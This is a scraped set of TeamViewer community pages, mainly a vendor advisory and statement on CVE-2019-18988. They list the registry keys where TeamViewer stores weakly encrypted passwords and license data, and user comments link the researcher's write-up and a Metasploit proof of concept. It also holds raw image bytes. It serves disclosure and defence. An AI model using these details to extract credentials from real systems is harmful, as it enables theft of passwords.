=== Content from twitter.com_9a37b8a6_20250121_011112.html ===



=== Content from community.teamviewer.com_81732b96_20250121_031847.html ===


# Categories

* [TeamViewer Remote](https://community.teamviewer.com/English/categories/teamviewer-en)

  Remote Access & Support
* [TeamViewer Tensor](https://community.teamviewer.com/English/categories/teamviewer-tensor)
* [TeamViewer Frontline](https://community.teamviewer.com/English/categories/frontline)
* [Remote Management](https://community.teamviewer.com/English/categories/itbrain)

  Manage, Monitor, Patch and Protect your devices
* [Other products](https://community.teamviewer.com/English/categories/other-products)

  Join the discussion about IoT, Engage, Servicecamp, and Meeting.
* [Announcements](https://community.teamviewer.com/English/categories/announcements)
* [Changelogs](https://community.teamviewer.com/English/categories/change-logs)

  Review TeamViewer´s latest Changelogs and product updates.
* [Blog](https://community.teamviewer.com/English/categories/community-blog-en)
* [About this Community](https://community.teamviewer.com/English/categories/welcome)

  Welcome to the TeamViewer Community.

## Try our Business license free for 30 days!

* [Try for free](https://service.teamviewer.com/mcp/checkout/cart/index/productsku/TVB0010-1MTRIAL_003592/qty/1/context/license_overview/?source=newcommunitybanner)
## Welcome!

It looks like you're new here. Sign in or register to get started.

* [Sign In](https://community.teamviewer.com/English/entry/signin)
* [Register](https://community.teamviewer.com/English/categories)

## Quick links

* [All Categories](/categories)
* [Recent Discussions](/discussions)
* [Activity](/activity)
* [Unanswered](/discussions/unanswered)

[![TeamViewer Logo](https://s7g10.scene7.com/is/content/teamviewergmbh/TeamViewer-Logo-light-1?dpr=off)](https://www.teamviewer.com/)

[![Facebook](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_FACEBOOK-3?dpr=off "Facebook")](https://www.facebook.com/teamviewer/)

[![LinkedIn](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_LINKEDIN-2?dpr=off "LinkedIn")](https://www.linkedin.com/company/teamviewer/)

[![Twitter](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_TWITTER-2?dpr=off "Twitter")](https://twitter.com/teamviewer)

[![Youtube](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_YOUTUBE-2?dpr=off "Youtube")](https://www.youtube.com/user/TeamViewer)

[![Instagram](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_INSTAGRAM-2?dpr=off "Instagram")](https://www.instagram.com/teamviewer/)

* [Privacy & Cookies](https://www.teamviewer.com/en/footer-pages/privacy-and-cookies/)
* [Contact](https://www.teamviewer.com/en/footer-pages/contact/)
* [EULA / DPA](https://www.teamviewer.com/en/footer-pages/eula-and-dpa/)
* [Product Description](https://www.teamviewer.com/en/footer-pages/product-description/)
* [Imprint](https://www.teamviewer.com/en/footer-pages/imprint/)



=== Content from community.teamviewer.com_12c7f60f_20250121_031853.html ===


# Announcements

* [Home](https://community.teamviewer.com/English/)
* [Support Forum](https://community.teamviewer.com/English/categories)
* [Announcements](https://community.teamviewer.com/English/categories/announcements)

* [Enhance the security of your remote devices](https://community.teamviewer.com/English/discussion/139462/enhance-the-security-of-your-remote-devices)

  At TeamViewer, we are committed to providing you with the most secure and seamless remote access experience. One key step in achieving this is moving away from using personal passwords for your remote devices. Instead, we encourage you to manage your devices by assigning them to your account and connecting via unattended…
* [Get started with TeamViewer Remote](https://community.teamviewer.com/English/discussion/136920/get-started-with-teamviewer-remote)

  Dear TeamViewer Community, Starting October 2024, TeamViewer Free users who haven’t already upgraded will move to our new interface. This ensures they have access to the latest features and enhanced security. Please note: For a limited time, you can switch back to the classic interface if needed. Benefits of the new…
* [Digitally signed invoices for enhanced security](https://community.teamviewer.com/English/discussion/139426/digitally-signed-invoices-for-enhanced-security)

  Dear TeamViewer customers, Your security is our top priority. In line with that, we’re implementing a more secure way of invoicing. From early January 2025, all invoices issued by TeamViewer will be digitally signed using a secure digital certificate for the Nordic region, which includes Denmark, Finland, the Faroe…
* [Important updates for the QuickJoin app and TeamViewer Meeting](https://community.teamviewer.com/English/discussion/139418/important-updates-for-the-quickjoin-app-and-teamviewer-meeting)

  Hi all, We want to announce some updates regarding the TeamViewer QuickJoin application and the URL meeting.teamviewer.com for user management. Removal of the QuickJoin application Effective 20 December 2024, the TeamViewer QuickJoin application will be removed from the TeamViewer download pages. After this date, customers…
* [Important updates for TeamViewer on macOS 15 Sequoia](https://community.teamviewer.com/English/discussion/137020/important-updates-for-teamviewer-on-macos-15-sequoia)

  Dear TeamViewer Community, Apple’s latest macOS 15, named Sequoia, introduces some new security features that will impact the TeamViewer user experience. To ensure smooth remote access and avoid interruptions, please review the following changes and recommendations when using TeamViewer on macOS 15. Note: This applies to…
* [Stay informed with our new email notification for security bulletins](https://community.teamviewer.com/English/discussion/136999/stay-informed-with-our-new-email-notification-for-security-bulletins)

  At TeamViewer, transparency around cybersecurity has always been a top priority. As cyberattacks continue to rise globally, we’re committed to keeping you informed and protected. That’s why we’re excited to announce a new feature: email push notifications for our security bulletins. You can now subscribe to receive…
* [Community badges revamp — What are Community badges?](https://community.teamviewer.com/English/discussion/136853/community-badges-revamp-what-are-community-badges)

  Hello everybody, We are delighted to announce that our Support Forum is getting new badges! Why were our badges revamped? To make your journey through the Community ranks even more astonishing, we have created a brand-new gamification system for our Support Forum's badges. Our new badge system will support your journey…
* [Community ranks revamp — What are Community ranks?](https://community.teamviewer.com/English/discussion/136618/community-ranks-revamp-what-are-community-ranks)

  Hello everybody, We are thrilled and delighted to share with you all the fantastic news that our Support Forum is getting a brand-new ranking system! Why are we getting new ranks? To make TeamViewer's learning journey even more exciting, we have created a brand-new gamification system for our Support Forum. We'd love to…
* [New updates regarding the free usage of TeamViewer 15](https://community.teamviewer.com/English/discussion/135484/new-updates-regarding-the-free-usage-of-teamviewer-15)

  Dear TeamViewer users, We want to touch base with some important updates regarding TeamViewer. First and foremost, our commitment to providing top-notch security remains unwavering. In line with this commitment, we continuously release updates to enhance security measures and introduce new features. As part of this ongoing…
* [Unable to open a support ticket? Here's why.](https://community.teamviewer.com/English/discussion/5274/unable-to-open-a-support-ticket-heres-why)

  Read this announcement in 中文 | Français | Deutsch | 日本語 / Português | Español If you've landed on this page, it is likely that you are seeking assistance from our Customer Support. Please take a moment to read the information below for a better understanding of our support policies. For free users At TeamViewer, we strive…
* [Complimentary TeamViewer 15 access for legacy versions to be deprecated](https://community.teamviewer.com/English/discussion/109492/complimentary-teamviewer-15-access-for-legacy-versions-to-be-deprecated)

  Hi all, Hoping that you enjoyed pleasant holidays despite the trying circumstances, we would like to send our best wishes for a Happy, Healthy New Year to all of you! Core to the earlier announced deprecation of legacy versions 8-10 is our commitment to always ensure the best possible security for the connectivity…
* [TeamViewer Remote’s Free Version Redesign](https://community.teamviewer.com/English/discussion/129407/teamviewer-remote-s-free-version-redesign)

  Dear TeamViewer Community, We are excited to announce that we have listened to your feedback and made changes to our free version accordingly. We have adjusted the free version’s feature set to make it easier and more accessible for you to connect with your friends and family remotely. Changes to the free version With the…
* [Manchester United and TeamViewer](https://community.teamviewer.com/English/discussion/112509/manchester-united-and-teamviewer)

  Hi all, A day to remember for all of us here at TeamViewer ⚽ We are excited that Manchester United and TeamViewer Announce New Principal Shirt Partnership. The agreement will bring together one of the world's most popular and successful sports teams with one of Europe's fastest-growing software companies. From the start of…
* [TeamViewer ending support server services for certain outdated software versions in Russia/Belarus](https://community.teamviewer.com/English/discussion/136890/teamviewer-ending-support-server-services-for-certain-outdated-software-versions-in-russia-belarus)

  Dear TeamViewer Customers, We would like to inform you that TeamViewer will no longer support server operations for certain outdated software versions in Russia and Belarus. Affected customers have been informed individually. In line with our terms and conditions, the use of the software in local area networks (LAN…
* [Introducing TeamViewer AI Services](https://community.teamviewer.com/English/discussion/138691/introducing-teamviewer-ai-services)

  TeamViewer continues to be the trusted solution for secure remote access and support, maintaining the highest privacy and security standards. With our legacy of reliability, we are proud to introduce TeamViewer AI Services. TeamViewer AI Services built upon our secure foundation to revolutionize your remote support…
* [Malwarebytes to rebrand as ThreatDown on invoices and quotes](https://community.teamviewer.com/English/discussion/137107/malwarebytes-to-rebrand-as-threatdown-on-invoices-and-quotes)

  Hello all, We want to inform you of an upcoming change regarding our Endpoint Protection services powered by Malwarebytes. To align with the rebranding of Malwarebytes for Business services to ThreatDown, all future quotes and invoices for Endpoint Protection, Endpoint Detection and Response, and all other Malwarebytes…
* [End of support for macOS 11 (Big Sur)](https://community.teamviewer.com/English/discussion/136655/end-of-support-for-macos-11-big-sur)

  Dear TeamViewer users, We would like to announce that as of November 2024, TeamViewer will no longer be supporting the macOS 11 (Big Sur) operating system, given the fact that macOS 11 has not received security updates from Apple since September 2023. The end of support means that TeamViewer versions newer than (and…
* [📣 The TeamViewer Knowledge Base has moved!](https://community.teamviewer.com/English/discussion/135712/the-teamviewer-knowledge-base-has-moved)

  Dear Community, we have an important update to share with you. We're making a change to how you access our Knowledge Base. Today the TeamViewer Knowledge Base has relocated from the Community to 👉 https://teamviewer.com/support 👈 Why the move? This move aims to centralize our support resources, making it easier for you to…
* [Important security announcement](https://community.teamviewer.com/English/discussion/136312/important-security-announcement)

  Dear TeamViewer users and customers, We are writing to inform you about a recent irregularity that our security team detected within our internal corporate IT environment. For more detailed information, we invite you to read our statement in our Trust Center here: Best regards, /JeanK
* [Introducing TeamViewer Spatial Support](https://community.teamviewer.com/English/discussion/134132/introducing-teamviewer-spatial-support)

  Dear TeamViewer Community, We are excited to share a groundbreaking announcement that takes TeamViewer into a new era of digital innovation. We have launched TeamViewer Spatial Support, a cutting-edge application that reinforces our commitment to staying at the forefront of technological advancements. With this new…

## Try our Business license free for 30 days!

* [Try for free](https://service.teamviewer.com/mcp/checkout/cart/index/productsku/TVB0010-1MTRIAL_003592/qty/1/context/license_overview/?source=newcommunitybanner)
## Welcome!

It looks like you're new here. Sign in or register to get started.

* [Sign In](https://community.teamviewer.com/English/entry/signin)
* [Register](https://community.teamviewer.com/English/categories/announcements)

## Quick links

* [All Categories](/categories)
* [Recent Discussions](/discussions)
* [Activity](/activity)
* [Unanswered](/discussions/unanswered)
## Popular tags

* [Issue](https://community.teamviewer.com/English/discussions/tagged/issue)
* [TeamViewer 15](https://community.teamviewer.com/English/discussions/tagged/teamviewer-15)
* [Android](https://community.teamviewer.com/English/discussions/tagged/android)
* [Windows](https://community.teamviewer.com/English/discussions/tagged/windows)
* [Question](https://community.teamviewer.com/English/discussions/tagged/question)
* [TeamViewer 14](https://community.teamviewer.com/English/discussions/tagged/teamviewer-14)
* [macOS](https://community.teamviewer.com/English/discussions/tagged/macos)
* [Linux](https://community.teamviewer.com/English/discussions/tagged/linux)
* [iOS](https://community.teamviewer.com/English/discussions/tagged/ios)
* [Changelogs](https://community.teamviewer.com/English/discussions/tagged/changelogs)

[![TeamViewer Logo](https://s7g10.scene7.com/is/content/teamviewergmbh/TeamViewer-Logo-light-1?dpr=off)](https://www.teamviewer.com/)

[![Facebook](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_FACEBOOK-3?dpr=off "Facebook")](https://www.facebook.com/teamviewer/)

[![LinkedIn](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_LINKEDIN-2?dpr=off "LinkedIn")](https://www.linkedin.com/company/teamviewer/)

[![Twitter](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_TWITTER-2?dpr=off "Twitter")](https://twitter.com/teamviewer)

[![Youtube](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_YOUTUBE-2?dpr=off "Youtube")](https://www.youtube.com/user/TeamViewer)

[![Instagram](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_INSTAGRAM-2?dpr=off "Instagram")](https://www.instagram.com/teamviewer/)

* [Privacy & Cookies](https://www.teamviewer.com/en/footer-pages/privacy-and-cookies/)
* [Contact](https://www.teamviewer.com/en/footer-pages/contact/)
* [EULA / DPA](https://www.teamviewer.com/en/footer-pages/eula-and-dpa/)
* [Product Description](https://www.teamviewer.com/en/footer-pages/product-description/)
* [Imprint](https://www.teamviewer.com/en/footer-pages/imprint/)



=== Content from community.teamviewer.com_b4ae48fe_20250121_011109.html ===


[Home](https://community.teamviewer.com/English/)› [Support Forum](https://community.teamviewer.com/English/categories)› [Announcements](https://community.teamviewer.com/English/categories/announcements)

# Specification on CVE-2019-18988

[![Natascha](https://us.v-cdn.net/6032394/uploads/lithium_avatars/n92918.jpg)](https://community.teamviewer.com/English/profile/Natascha "Natascha")
[Natascha](https://community.teamviewer.com/English/profile/Natascha)
Posts: **1,591** **Moderator** ☑

[February 2020](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)
 edited May 2023   in [Announcements](https://community.teamviewer.com/English/categories/announcements)

Hi all,

As a follow-up to our [Statement on Recent Post - CVE-2019-18988](https://community.teamviewer.com/t5/Announcements/Statement-on-Recent-Post-CVE-2019-18988/td-p/82173) regarding the encryption of TeamViewer registry keys, we would like to again clarify that TeamViewer account passwords are not affected as we use Secure Remote Password (SRP) for account authentication. The issue discussed in a blog post by a security researcher concerns the local data storage and encryption of the TeamViewer client as detailed below. In order to take advantage of the issue, someone would need to have already gained access to a user’s system via other means.

### What is it not?

TeamViewer account password encryption has not been compromised. TeamViewer implements Secure Remote Password (SRP) for account authentication.
In the blog post, the researcher mentions a privilege escalation risk. There’s no direct vulnerability offering someone the ability to gain additional privileges on the local system. The only risk would be in the case that a user is reusing the exposed passwords on other services.

### What is it?

In the blog post the researcher discusses the encryption of certain Windows Registry entries, which may include the TeamViewer client settings-password that is used to restrict configuration access. Additionally, these registry keys can hold temporary information used only in specific TeamViewer client deployments as well as for the TeamViewer license and statically configured session passwords of legacy versions. The blog post also refers to some unused registry keys.

### What does it mean?

As this is a local exploit, in order to take advantage of the issue, someone would need to have already gained access to a user’s system via other means. In this case, someone who manages to decrypt the registry entries in question would gain access to:

* The client settings-password that allows administrators to restrict user access to the configuration panel of a local TeamViewer instance. In most cases, this password is not implemented.
* A statically configured session passwords for TeamViewer version 8 only. By default, this feature is not used, but our dynamically generated password that changes with every session. Versions older than TeamViewer 8 are affected as well but will be deprecated by the end of this week under a separate initiative
* The password for proxies configured in the TeamViewer client. This is used only in unusual instances as TeamViewer does not require a proxy configuration in most environments. A use case for this setup is for companies that chose to have a custom proxy specifically for TeamViewer.
* The license key for the installed TeamViewer client on a perpetual plan. Perpetual licenses are all versions prior to TeamViewer 14. TeamViewer 15 licenses are subscriptions which do not use this registry key.

The remainder of the registry entries are used only during deployment process and are automatically cleaned up afterwards.

### What are we doing?

Our security engineers are working on concrete solutions to mitigate the researcher's findings such as further improving the encryption for the data points that need to be available on the local system.

The changes will be centered around improving the security and limiting the use of local registry keys. There are certain values that need to be stored locally for the usage of TeamViewer. As the client has changed over time through major releases, some of those are still required while others make sense to store centrally or deprecate out of the product.

Here are the 7 registry keys discussed in the researcher’s blog post:

#### SecurityPasswordAES

This registry key is only valid in TeamViewer versions older than TeamViewer 9. By default, TeamViewer utilizes a dynamic password system that generates a new session password with each session. For those users who chose to set a static session password in order to support unattended access, that value is stored in this registry key. Since then we introduced an option called easy access, based on the account authentication and inviting the user to distance themselves from using a static password which can be weak, re-used from somewhere else, guessed, etc.

*Planned Fix*
Strengthen the cryptography. Adapt the storage/verification to a more modern method.

#### SecurityPasswordExported

This registry key is used for cases where users chose to export their configurations in order to make it portable to other systems. It is important to note that this key is an ephemeral value that is only existent during the export/import of a configuration.

*Planned Fix*
Strengthen the cryptography. Change export file type to something other than .reg so that users don’t mistakenly import this value permanently into the registry.

#### ServerPasswordAES

This registry key was added to the client as preparation for an unimplemented backend feature. It is not used.

*Planned Fix*
Remove the key from the client.

#### ProxyPasswordAES

TeamViewer has quite a few methods of reaching the internet that make it easy for users to use the product in a large variety of network configurations. Be it TCP, UDP hole punching, over HTTP ports or by inheriting the local systems proxy configuration. Sometimes customers chose to set up a custom proxy just for TeamViewer, and in those cases, we store a password for that proxy configuration in this registry key.

*Planned Fix*
Strengthen the method used to read the value. This entry would only be considered if the service is running which allows us to use a strong cryptographic model.

#### LicenseKeyAES

This is the license key for TeamViewer clients installed with a license. The registry key only exists until the client registers with our servers; after that it is deleted.
For newer versions of TeamViewer (some v14 and all v15) the license is under a subscription model that is tied to an account authentication. The registry key is not used in these cases.

*Planned Fix*
Remove the key from TeamViewer 15 as it is not used in that version. Legacy versions still need to support that temporary entry, given the former licensing model.

#### OptionsPassword

As with most client applications, the TeamViewer client is open to configuration by the current logged in user on the machine. We offer the option to lock those configurations with a password. This is usually used in deployments in larger environments to help IT administrator preventing any alteration of the configuration.

*Planned Fix*
Change the way this is handled cryptographically.

#### PermanentPassword

TeamViewer implemented the Secure Remote Password protocol for authentication starting with TeamViewer 9. This key is used to store the SRP password verifier as part of that protocol.

*Planned Fix*
No fix needed, works as intended. Not vulnerable.

Best,
Natascha

German Community moderator 💙 Moderatorin der deutschsprachigen Community

Tagged:

* [Security](/English/discussions?tagID=14)
* [Announcement](/English/discussions?tagID=79)

4

## Comments

* [![Psyber_Attack](https://w1.vanillicon.com/v2/1fae0f48751d2b7e94c3c993e22b0288.svg)](https://community.teamviewer.com/English/profile/Psyber_Attack "Psyber_Attack")
  [Psyber\_Attack](https://community.teamviewer.com/English/profile/Psyber_Attack)

  Posts: **1**

  [February 2020](/English/discussion/comment/82533/#Comment_82533)

  Malware getting access to Proxy Passwords and the TeamViewer license are pretty bad things, but you are mistaken when you say most people don't lock the options menu...and, worse, people will often have one password that they reuse across the platform, (login password, options menu and remote access etc).

  You're effectively saying that your product is unusable in a secure enviroment, and that large features like the proxy implementation leak important data, but it's OK because people don't use them or have usually implemented other solutions so it's fine....which is, frankly, a bit weird...but, anyway, I made a video of your latest release being exploited so that your users can decide for themselves how bad this is.or isn't.

  1

[Trustpilot](https://uk.trustpilot.com/review/www.teamviewer.com)

#### Categories

* [All Categories](/English/categories)
* [28.4K TeamViewer Remote](https://community.teamviewer.com/English/categories/teamviewer-en)
* [192 TeamViewer Tensor](https://community.teamviewer.com/English/categories/teamviewer-tensor)
* [11 TeamViewer Frontline](https://community.teamviewer.com/English/categories/frontline)
* [339 Remote Management](https://community.teamviewer.com/English/categories/itbrain)
* [700 Other products](https://community.teamviewer.com/English/categories/other-products)
* [123 Announcements](https://community.teamviewer.com/English/categories/announcements)
* [1K Changelogs](https://community.teamviewer.com/English/categories/change-logs)
* [159 Blog](https://community.teamviewer.com/English/categories/community-blog-en)
* [11 About this Community](https://community.teamviewer.com/English/categories/welcome)

#### This Week's Leaders

* [63 Points ![](https://w3.vanillicon.com/v2/3fda4c1e004fa446d87bfa5d3dfef002.svg) Peter\_Fibæk](https://community.teamviewer.com/English/profile/Peter_Fib%C3%A6k)
* [40 Points ![](https://w3.vanillicon.com/v2/35c701c749f36859ac410091b2b2ec71.svg) jpducharme](https://community.teamviewer.com/English/profile/jpducharme)
* [30 Points ![](https://wd.vanillicon.com/v2/d244abb3b866bd30310696e038c87cf0.svg) norm1206](https://community.teamviewer.com/English/profile/norm1206)
* [25 Points ![](https://wa.vanillicon.com/v2/abac55d2ef0ffe9e82e835b70b0234d2.svg) stevejanko](https://community.teamviewer.com/English/profile/stevejanko)
* [20 Points ![](https://w4.vanillicon.com/v2/401921d5a0aa9223e95c9d592f5edf36.svg) mboursiquot](https://community.teamviewer.com/English/profile/mboursiquot)
* [20 Points ![](https://w6.vanillicon.com/v2/6eabef160752583c710006b93419a888.svg) Admin\_Douaud](https://community.teamviewer.com/English/profile/Admin_Douaud)
* [20 Points ![](https://w4.vanillicon.com/v2/473ec9e8a6e142ec59f89d334f965bcb.svg) tectom](https://community.teamviewer.com/English/profile/tectom)
* [20 Points ![](https://wd.vanillicon.com/v2/ded33bc938b9a0ea6d1a60cf93ad6445.svg) ehtan](https://community.teamviewer.com/English/profile/ehtan)
* [20 Points ![](https://w5.vanillicon.com/v2/55d0d4be94ce1b28af16b4207af7e5c8.svg) atrain1111](https://community.teamviewer.com/English/profile/atrain1111)
* [15 Points ![](https://w4.vanillicon.com/v2/4a084e4a6988387695ff75e4a2b33298.svg) Eric6790](https://community.teamviewer.com/English/profile/Eric6790)

[![TeamViewer Logo](https://s7g10.scene7.com/is/content/teamviewergmbh/TeamViewer-Logo-light-1?dpr=off)](https://www.teamviewer.com/)

[![Facebook](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_FACEBOOK-3?dpr=off "Facebook")](https://www.facebook.com/teamviewer/)

[![LinkedIn](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_LINKEDIN-2?dpr=off "LinkedIn")](https://www.linkedin.com/company/teamviewer/)

[![Twitter](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_TWITTER-2?dpr=off "Twitter")](https://twitter.com/teamviewer)

[![Youtube](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_YOUTUBE-2?dpr=off "Youtube")](https://www.youtube.com/user/TeamViewer)

[![Instagram](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_INSTAGRAM-2?dpr=off "Instagram")](https://www.instagram.com/teamviewer/)

* [Privacy & Cookies](https://www.teamviewer.com/en/footer-pages/privacy-and-cookies/)
* [Contact](https://www.teamviewer.com/en/footer-pages/contact/)
* [EULA / DPA](https://www.teamviewer.com/en/footer-pages/eula-and-dpa/)
* [Product Description](https://www.teamviewer.com/en/footer-pages/product-description/)
* [Imprint](https://www.teamviewer.com/en/footer-pages/imprint/)



=== Content from us.v-cdn.net_844e5c48_20250121_031853.html ===
RIFF�  WEBPVP8 ~  �7 �\*� � >I�C������(���h�2\*�W>��e�o�wڔ��ψ����@8��|�n���|�X���U��/�E�y���>��n�C�-�����D�j3�)2v� ��s3�޿��\*ӣ��T�e���q���aTؾ�@��̔��m"!�~oJ�!ȶ��4�l)g���������հܤ��&�o��}��� <�h�'?�Q�9�i�}q^��]B��D�&S9J�iY8奙-�䠤U9.R�0���'��x=�r�f��6���<� �л�ɫ� �-^E ����qY�����b/�礊��E�;�3�tI�q���@��\_zrE�P���`u�݋o���i�q�r�$.�dz~�u'k NG\*�K� ���!����o ��cr���x)�XRi�e�����!���+���Q�� ǐ��[AZ���QkE��t�]Dm�
&�q��p�.�6��Ѱ6ة�P'$H?��ጡ�rԔE����i�VJ�=�h�2J��VfL��-SP7ZZ�7!L�Ђ��ft���@4�MC<�^7�#9ܯu�-{�77F����)bR=B@W�փG���y\^���i����B�v�#�E~��fBD~��\*\J?�8��/����m��+⨽�)Q��Kޫ�`G��Q6P�p/�I�����42��O����w��
�9�hE���;0��k6�\*�Di�@�p�u������d�YF��P�������K�Ȉ�2�/�fW~�<�%�6��4 �"��?(��Xr��1�]2,6��SX�ɩT��`� q"!GRu��Lc |~2uj���OśM&�B�ybPCQ�|��%�E�r�l�(߆I���?�L^��"\*U�:'/������C���[�\_ ��S!�>�'?8���|^i-M�m�#�H���μ�/:\*�c��0�����?��`���Ux3�ƷX���Ŵ�=W�n�?�qB���~���U���Җ����?:�b�L<�C;��ɡ�T��b�ZF�\�c�Y������@��\y,�E��+���S����+
Agg���ǒo����nq&��1 ���@l�@��pf�T��V��\*�,��$}�|��Nup�Mµ�{ ���ٸ'���t��-�z5c�-�&��O�Cu�X�x���4TJE�}������u�Y�@��!�2�C߫^/�AB���Dep��i�]��c�$N��-����wO��\_}D#h+������1�G�.�0�w��ҽ�����~Z��=8$96�6W�����ڏ2�����V�a��#"�������m,I�
`?���c{�o�W�5���$z:G�(���F������|��t#��E�O�ᨺ��{H�V��ߎ�ל2����eJ�/��e���x�)1� >����̯��2�c���P^���hI�l盺�8q���lQ���Q��k�����𾗑��t��\�4�%̙q߱��$#hi�M%�\���2"��B�qu��p0���l���0\*�h<��д�9n\��/��ᵨ���Է�\B 8�=K��
��H�d���2�4ח%A�rxu.�l��w�ҋI,�D��ز��fS��(�� !
����s�) �ǹHD� �T=��UuĬ�"�Ĭ���Y���G�Z РTߣ?#OF!r��g<����f
 '�b�Y�AV,�s)�/J9&���^����n  $ 4��\_��+к>��Q�Q�HJdɀ,�k/������ӣ�����4��ҷ6k1 )��b#9o��`F�bV9
��R=�wJ~u^,�3�l���}<9 �ς�O.jD��ͩ�Q�2�b^�<ܔ�ǹ%�=i�K�K���#QrN/I�eϞf���^3bMe9��" z�e[rd�r���@�~F���x�� vN��܍S�Z�&��Ҕ�"��0��ԟ�I�@-�s\���K���[�J�"��٪f��eРT��{���I43j
v�4X��E�|l[ǫB�Th�xS�����\*n�ټI�
f�g��ΐ�\*&yG�9�Vƪ��-`���w�´=��e�y 2����bSXޫ�М9�˙f��t���=&� +M���\_����5�n;\_i�{��P�2�&o�l@ȷ���z!�!m�#~,�vCl��็������b\Gٙ�}`��\_�Q���MUe��u��ͧ]�R��}�5gҴ�,=X\ ��G����¶I�&Mo8X� �y
��D��$ș�$�!\X(ë�%#L
��п���50�<2#Q$�1ۉ;'�������i/�]�y��-Y-�� ��\_Z�q��zH�tn{+�G��ŕ!sX�>x�O��˿�   

=== Content from community.teamviewer.com_3ea6c1bf_20250121_031855.html ===


[Home](https://community.teamviewer.com/English/)› [Support Forum](https://community.teamviewer.com/English/categories)› [Announcements](https://community.teamviewer.com/English/categories/announcements)

# Statement on Recent Post - CVE-2019-18988

[![Natascha](https://us.v-cdn.net/6032394/uploads/lithium_avatars/n92918.jpg)](https://community.teamviewer.com/English/profile/Natascha "Natascha")
[Natascha](https://community.teamviewer.com/English/profile/Natascha)
Posts: **1,591** **Moderator** ☑

[February 2020](https://community.teamviewer.com/English/discussion/82173/statement-on-recent-post-cve-2019-18988)
 edited May 2023   in [Announcements](https://community.teamviewer.com/English/categories/announcements)

Hi all,

TeamViewer is safe to use. You may have seen a recent blog post and subsequent Social Media discussions regarding the reverse engineering of some locally stored TeamViewer settings. While our security engineers are looking into this issue with all due diligence, we would like to stress that we do not deem it highly critical upon first assessment.

The issue does not affect TeamViewer account passwords needed to log into TeamViewer. Also, in order to take advantage of the issue, someone would need to have already gained access to a user’s system via other means.

Regardless of our assigned criticality, we certainly take the provided information very seriously as it shows that there is room for improvement, which we are already addressing. We will be reaching out to the researcher to discuss his findings and will update you on our potential mitigation steps shortly.

Again, TeamViewer is safe to use. As always, we encourage our users to always use the latest TeamViewer version and to keep their systems updated. Please do not hesitate to contact our [support team](https://www.teamviewer.com/en/support/contact/) with any questions you might have.

Best regards,
Natascha

German Community moderator 💙 Moderatorin der deutschsprachigen Community

Tagged:

* [Security](/English/discussions?tagID=14)
* [Announcement](/English/discussions?tagID=79)

3

## Comments

* [![JulioRossini](https://w0.vanillicon.com/v2/047b9dc664075cb6cd19f6f639712b14.svg)](https://community.teamviewer.com/English/profile/JulioRossini "JulioRossini")
  [JulioRossini](https://community.teamviewer.com/English/profile/JulioRossini)

  Posts: **1**

  [February 2020](/English/discussion/comment/82187/#Comment_82187)

  The vulnerability notice was made more than two months ago.

  Security team must have taken the warning seriously.
  <https://whynotsecurity.com/blog/teamviewer/>

  1
* [![QuillOmega0](https://w3.vanillicon.com/v2/3d838940e4dc8c51520f043eb4b50d09.svg)](https://community.teamviewer.com/English/profile/QuillOmega0 "QuillOmega0")
  [QuillOmega0](https://community.teamviewer.com/English/profile/QuillOmega0)

  Posts: **1**

  [February 2020](/English/discussion/comment/82191/#Comment_82191)

  So when you say:

  > ---
  >
  > [@Natascha](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/92918) wrote:
  >
  > Hi all,
  >
  > TeamViewer is safe to use. You may have seen a recent blog post and subsequent Social Media discussions regarding the reverse engineering of some locally stored TeamViewer settings. While our security engineers are looking into this issue with all due diligence, we would like to stress that we do not deem it highly critical upon first assessment.
  >
  > The issue does not affect TeamViewer account passwords needed to log into TeamViewer. Also, in order to take advantage of the issue, someone would need to have already gained access to a user’s system via other means.
  >
  > Regardless of our assigned criticality, we certainly take the provided information very seriously as it shows that there is room for improvement, which we are already addressing. We will be reaching out to the researcher to discuss his findings and will update you on our potential mitigation steps shortly.
  >
  > Again, TeamViewer is safe to use. As always, we encourage our users to always use the latest TeamViewer version and to keep their systems updated. Please do not hesitate to contact our [support team](https://www.teamviewer.com/en/support/contact/) with any questions you might have.
  >
  > Best regards,
  > Natascha
  >
  > ---

  This means any domain joined computer with multiple user accounts now has a user able to elevate to local adminsitrator rights?

  Do you now see how that can be a problem?

  1
* [![C0ntr07](https://we.vanillicon.com/v2/e53f4409df0ce87a4b6dca5035610637.svg)](https://community.teamviewer.com/English/profile/C0ntr07 "C0ntr07")
  [C0ntr07](https://community.teamviewer.com/English/profile/C0ntr07)

  Posts: **1**

  [February 2020](/English/discussion/comment/82193/#Comment_82193)

  Natascha your statements, "we do not deem it highly critical upon first assessment" and " TeamViewer is safe to use" shows a complete lack of taking this matter seriously. While you might not understand the potential impact, those of us with Global Security responsibilities certainly do.

  TeamViewer really didn't take this that seriously - did you?

  Timeline:

  + November 05th, 2019: Reach out to [@TeamViewer](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/262212)\_help on Twitter
  + November 05th, 2019: Send email to the Director of Security
  + November 14th, 2019: Request CVE based on precedent set by CVE-2014-1812
  + November 15th, 2019: Receive CVE-2019-18988
  + November 15th, 2019: Send email to Director of Security notifying them there is now a CVE assigned to this
  + November 18th, 2019: Receive first and only email back from vendor “We’re looking into it” email
  + January 13th, 2020: Status update request email sent to Director of Security
  + February 03rd, 2020: Publish writeup

  If your position turns out to be inaccurate, will you accept financial responsiblity for our loses?

  I thought not.

  FYI - here is the POC <https://github.com/rapid7/metasploit-framework/pull/12900>

  2
